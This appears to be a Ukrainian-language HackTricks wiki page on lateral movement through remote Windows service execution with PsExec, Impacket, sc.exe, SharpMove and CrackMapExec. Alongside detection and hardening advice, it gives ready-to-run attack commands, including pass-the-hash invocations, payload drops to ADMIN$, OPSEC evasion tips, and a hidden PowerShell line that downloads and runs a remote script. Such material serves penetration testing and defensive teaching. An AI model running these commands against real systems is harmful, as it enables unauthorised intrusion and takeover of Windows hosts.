# Віддалене виконання команд через служби (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Як вони працюють

Ці техніки зловживають Windows Service Control Manager (SCM) віддалено через SMB/RPC, щоб виконувати команди на цільовому хості. Service Control Manager Remote Protocol (SCMR) — це інтерфейс на основі RPC для налаштування та керування службами Windows на віддаленому комп’ютері. Маючи достатні дозволи, оператор може створити або переналаштувати службу, вказавши команду в шляху до її бінарного файлу, а потім запустити цю службу для віддаленого виконання команди.<sup>[[5]](#references)</sup> Зазвичай процес відбувається так:

1. Автентифікуватися на цільовому хості через SMB/RPC (TCP/445); отримати доступ до спільного ресурсу ADMIN$, якщо вибраний варіант потребує розміщення там файлу або отримання звідти виводу.
2. Скопіювати виконуваний файл або вказати командний рядок LOLBAS, який виконуватиме служба.
3. Віддалено створити службу через SCM (MS-SCMR через \PIPE\svcctl), вказавши цю команду або бінарний файл.
4. Запустити службу для виконання payload і, за потреби, перехоплювати stdin/stdout через іменований канал.
5. Зупинити службу та очистити систему (видалити службу й усі розміщені бінарні файли).

Вимоги та попередні умови:
- Права Local Administrator на цільовому хості (SeCreateServicePrivilege) або явні права на створення служб на цільовому хості.
- Доступність SMB (445) і дозвіл Remote Service Management у брандмауері хоста; ADMIN$ має бути доступним для варіантів, які використовують його для розміщення файлу або отримання виводу.
- Обмеження віддаленого доступу UAC: для локальних облікових записів фільтрація токенів може блокувати мережевий доступ адміністратора, якщо не використовувати вбудований обліковий запис Administrator або не встановити LocalAccountTokenFilterPolicy=1.
- Kerberos і NTLM: використання імені хоста/FQDN дає змогу застосувати Kerberos; підключення за IP-адресою часто спричиняє перехід на NTLM (який може бути заблокований у захищених середовищах).

Якщо обліковий запис служби не вказано, `CreateService` використовує `LocalSystem`, який має широкі локальні привілеї. Це пояснює серйозні наслідки успішного виконання через SCM. Такий спосіб сам по собі не вимикає UAC або Microsoft Defender: виклику все одно потрібні права віддаленого доступу до SCM, а засоби захисту кінцевих точок можуть перевіряти або блокувати службу чи payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### Ручне виконання через ScExec/WinExec за допомогою sc.exe

Нижче показано мінімальний спосіб створення служби. Образом служби може бути розміщений EXE або LOLBAS, як-от cmd.exe чи powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Нотатки:
- Очікуйте помилку тайм-ауту під час запуску EXE-файлу, який не є службою; виконання все одно відбувається.
- Щоб діяти більш OPSEC-friendly, надавайте перевагу fileless-командам (cmd /c, powershell -enc) або видаляйте залишені артефакти.

Детальніші кроки наведено тут: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Інструменти та приклади

### Sysinternals PsExec.exe

- Класичний інструмент адміністратора, який використовує SMB для розміщення PSEXESVC.exe в ADMIN$, встановлює тимчасову службу (назва за замовчуванням — PSEXESVC) і проксіює введення-виведення через іменовані канали.
- Приклади використання:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Запустити можна безпосередньо з Sysinternals Live через WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Залишає події встановлення/видалення служби (назва служби часто PSEXESVC, якщо не використовується -r) і під час виконання створює C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (подібний до PsExec)

- Використовує вбудовану службу на кшталт RemCom. Копіює тимчасовий бінарний файл служби (зазвичай із випадковою назвою) через ADMIN$, створює службу (типово RemComSvc) і передає введення-виведення через іменований канал.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

У Kali приклади Impacket можуть міститися в `/usr/share/doc/python3-impacket/examples/`. Якщо пароль не вказано, інструмент запитує його. Параметр `-k` у Impacket запитує автентифікацію Kerberos замість NTLM, зазвичай використовуючи поточний кеш облікових даних або надані облікові дані.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Артефакти
- Тимчасовий EXE у C:\Windows\ (8 випадкових символів). Назва служби за замовчуванням — RemComSvc, якщо її не перевизначити.

### Impacket smbexec.py (SMBExec)

- Створює тимчасову службу, яка запускає cmd.exe, і використовує іменований канал для введення-виведення. Зазвичай уникає скидання повного EXE payload; виконання команд є напівінтерактивним.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) реалізує кілька методів lateral movement, зокрема service-based exec.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) підтримує автентифіковане віддалене виконання через SCM та кілька інших механізмів Windows, зокрема зміну й створення служб.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Ви також можете використовувати CrackMapExec для виконання команд через різні бекенди (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec з SharpMove

Дія SCM створює службу з назвою `WindowsDebug` і вказує на payload, який уже є на віддаленому хості.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, виявлення та артефакти

Типові артефакти на хості/в мережі під час використання методів на кшталт PsExec:
- Security 4624 (Logon Type 3) і 4672 (Special Privileges) на цільовому хості для використаного облікового запису адміністратора.
- Події Security 5140/5145 File Share і File Share Detailed, що показують доступ до ADMIN$ та створення/запис файлів бінарних файлів служб (наприклад, PSEXESVC.exe або випадкового .exe із 8 символів).
- **System** 7045 від Service Control Manager про встановлення служби на цільовому хості: назви на кшталт PSEXESVC, RemComSvc або власні (`-r` / `-service-name`). Це підтверджує встановлення служби, але не запуск її образу. За наявності зіставте час події та шлях до образу з подіями процесів або відповідним записом prefetch образу служби.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) для services.exe або образу служби, 3 (Network Connect), 11 (File Create) у C:\Windows\, 17/18 (Pipe Created/Connected) для каналів на кшталт \\.\pipe\psexesvc, \\.\pipe\remcom_* або їхніх рандомізованих варіантів.
- Артефакт у реєстрі для EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 на хості оператора (якщо це не вимкнено).

Ідеї для пошуку
- Створюйте сповіщення про встановлення служб, у яких ImagePath містить cmd.exe /c, powershell.exe або шляхи TEMP.
- Шукайте створення процесів, де ParentImage — C:\Windows\PSEXESVC.exe, або дочірні процеси services.exe, що запускаються від імені LOCAL SYSTEM і виконують оболонки.
- Позначайте іменовані канали, що закінчуються на -stdin/-stdout/-stderr, або відомі назви каналів клонів PsExec.

## Усунення типових проблем
- Відмовлено в доступі (5) під час створення служб: обліковий запис насправді не має прав локального адміністратора, діють віддалені обмеження UAC для локальних облікових записів або EDR захищає шлях до бінарного файлу служби від підміни.
- Мережевий шлях не знайдено (53) або не вдалося підключитися до ADMIN$: брандмауер блокує SMB/RPC або спільні адміністративні ресурси вимкнено.
- Kerberos не працює, але NTLM заблоковано: підключайтеся за іменем хоста/FQDN (не IP-адресою), перевірте SPN або вкажіть -k/-no-pass із квитками під час використання Impacket.
- Час очікування запуску служби минув, але payload виконався: це очікувано, якщо файл не є справжнім бінарним файлом служби; збережіть вивід у файл або використайте smbexec для введення-виведення в реальному часі.

## Примітки щодо посилення захисту
- У Windows 11 24H2 і Windows Server 2025 підписування SMB за замовчуванням потрібне для вихідних підключень (а у Windows 11 — і для вхідних). Це не порушує легітимне використання PsExec із дійсними обліковими даними, але запобігає зловживанню ретрансляцією непідписаного SMB і може вплинути на пристрої, що не підтримують підписування.<sup>[[2]](#references)</sup>
- Нове блокування NTLM у SMB-клієнті (Windows 11 24H2/Server 2025) може завадити переходу на NTLM під час підключення за IP-адресою або до серверів без Kerberos. У середовищах із посиленим захистом це порушить роботу PsExec/SMBExec на основі NTLM; використовуйте Kerberos (ім’я хоста/FQDN) або налаштуйте винятки, якщо це справді потрібно.<sup>[[2]](#references)</sup>
- Принцип найменших привілеїв: обмежуйте членство в групі локальних адміністраторів, надавайте права Just-in-Time/Just-Enough Admin, забезпечте використання LAPS і відстежуйте/налаштуйте сповіщення про встановлення служб із подією 7045.

## Див. також

- Віддалене виконання на основі WMI (часто з меншим використанням файлів):

{{#ref}}
./wmiexec.md
{{#endref}}

- Віддалене виконання на основі WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Посилення безпеки SMB у Windows Server 2025 і Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Використання облікових даних для захоплення контролю над комп’ютерами Windows — частина 2 (PSExec і служби)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Усунення непередбачених перезавантажень за допомогою системних журналів подій](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - огляд протоколу віддаленого керування службами](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - обліковий запис LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - функція `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
